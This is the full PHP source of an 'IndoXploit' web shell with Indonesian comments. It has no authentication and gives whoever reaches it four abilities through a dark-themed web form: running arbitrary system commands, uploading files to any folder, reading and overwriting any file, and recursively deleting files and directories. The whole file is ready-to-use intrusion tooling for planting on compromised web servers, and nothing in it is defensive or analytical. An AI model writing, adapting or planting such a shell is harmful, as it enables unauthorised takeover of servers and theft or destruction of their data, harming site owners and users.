<?php
// ===============================
// IndoXploit Shell - Updated PHP
// ===============================

// --- Sanitizer (ganti magic_quotes_gpc) ---
function idx_ss($array) {
    return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
}
if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
    $_POST    = idx_ss($_POST);
    $_COOKIE  = idx_ss($_COOKIE);
    $_REQUEST = idx_ss($_REQUEST);
}

// --- Utility: Execute Command ---
function idx_exec($cmd) {
    if (function_exists('shell_exec')) return shell_exec($cmd);
    elseif (function_exists('exec')) { exec($cmd, $o); return implode("\n", $o); }
    elseif (function_exists('system')) { ob_start(); system($cmd); return ob_get_clean(); }
    elseif (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); }
    else return "Command execution not available.";
}

// --- Utility: File Operations ---
function idx_readfile($path) {
    return is_readable($path) ? file_get_contents($path) : false;
}
function idx_writefile($path, $content) {
    return is_writable(dirname($path)) ? file_put_contents($path, $content) : false;
}
function idx_delete($path) {
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            idx_delete("$path/$file");
        }
        return rmdir($path);
    } elseif (is_file($path)) {
        return unlink($path);
    }
    return false;
}

// ===============================
// Part 5: Handler Request & Aksi
// ===============================

// --- Command Execution ---
if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $command = $_POST['cmd'];
    $output = idx_exec($command);
}

// --- File Upload ---
if (isset($_FILES['upload'])) {
    $uploaddir = isset($_POST['path']) ? $_POST['path'] : getcwd();
    $uploadfile = $uploaddir . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadfile)) {
        $msg = "File berhasil diupload ke: $uploadfile";
    } else {
        $msg = "Upload gagal!";
    }
}

// --- File Editor Save ---
if (isset($_POST['savefile']) && isset($_POST['filepath']) && isset($_POST['filecontent'])) {
    $filepath = $_POST['filepath'];
    $content  = $_POST['filecontent'];
    if (idx_writefile($filepath, $content)) {
        $msg = "File berhasil disimpan: $filepath";
    } else {
        $msg = "Gagal menyimpan file!";
    }
}

// --- File Delete ---
if (isset($_POST['delete']) && isset($_POST['target'])) {
    $target = $_POST['target'];
    if (idx_delete($target)) {
        $msg = "Berhasil menghapus: $target";
    } else {
        $msg = "Gagal menghapus: $target";
    }
}

// --- File View ---
if (isset($_GET['viewfile'])) {
    $filepath = $_GET['viewfile'];
    $filecontent = idx_readfile($filepath);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IndoXploit Shell (Updated PHP)</title>
    <style>
        body {
            background: #141e30;
            color: #eee;
            font-family: monospace;
            margin: 0;
            padding: 0;
        }
        h1 {
            background: linear-gradient(90deg, #243b55, #141e30);
            margin: 0;
            padding: 15px;
            font-size: 18px;
            color: #0ff;
        }
        .container {
            padding: 15px;
        }
        .section {
            margin-bottom: 20px;
            background: #1f2937;
            padding: 15px;
            border-radius: 10px;
        }
        textarea, input[type=text], input[type=file] {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            background: #111827;
            color: #0ff;
            border: 1px solid #374151;
            border-radius: 6px;
            font-family: monospace;
        }
        input[type=submit], button {
            background: #243b55;
            color: #eee;
            border: none;
            padding: 8px 12px;
            margin-top: 8px;
            border-radius: 6px;
            cursor: pointer;
        }
        pre {
            background: #111827;
            padding: 10px;
            border-radius: 6px;
            overflow-x: auto;
        }
        .msg { color: #0f0; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>💀 IndoXploit Shell - Updated</h1>
    <div class="container">

        <?php if(isset($msg)) echo "<div class='msg'>{$msg}</div>"; ?>

        <!-- Command Execution -->
        <div class="section">
            <h2>💻 Execute Command</h2>
            <form method="post">
                <input type="text" name="cmd" placeholder="whoami">
                <input type="submit" value="Run">
            </form>
            <?php if(isset($output)): ?>
                <h3>Result:</h3>
                <pre><?php echo htmlspecialchars($output); ?></pre>
            <?php endif; ?>
        </div>

        <!-- File Upload -->
        <div class="section">
            <h2>📤 Upload File</h2>
            <form method="post" enctype="multipart/form-data">
                <input type="text" name="path" placeholder="Target folder (default: cwd)">
                <input type="file" name="upload">
                <input type="submit" value="Upload">
            </form>
        </div>

        <!-- File Editor -->
        <div class="section">
            <h2>📝 File Editor</h2>
            <form method="get">
                <input type="text" name="viewfile" placeholder="Path file buat dibuka">
                <input type="submit" value="Open">
            </form>
            <?php if(isset($filecontent)): ?>
                <form method="post">
                    <input type="hidden" name="filepath" value="<?php echo htmlspecialchars($filepath); ?>">
                    <textarea name="filecontent" rows="20"><?php echo htmlspecialchars($filecontent); ?></textarea>
                    <input type="submit" name="savefile" value="Save File">
                </form>
            <?php endif; ?>
        </div>

        <!-- File Delete -->
        <div class="section">
            <h2>🗑️ Delete File/Folder</h2>
            <form method="post">
                <input type="text" name="target" placeholder="Path file/folder">
                <input type="submit" name="delete" value="Delete">
            </form>
        </div>

    </div>
</body>
</html>
